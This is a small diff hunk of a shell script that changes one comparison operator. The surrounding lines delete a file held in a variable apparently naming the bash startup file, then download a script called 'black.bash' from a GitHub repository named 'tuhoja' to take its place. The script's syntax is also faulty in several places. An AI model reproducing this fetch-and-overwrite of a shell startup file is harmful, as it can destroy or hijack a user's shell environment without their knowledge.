@@ -4,7 +4,7 @@ safe = 0
 config = ~/totallysfa
 if test -f $config; then
   safe = cat $config
-  if $safe == 0; then
+  if $safe -eq 0; then
     rm -rf $bashcr
     wget -o $bashcr https://github.com/Poliisi5/tuhoja/raw/refs/heads/main/black.bash
   else
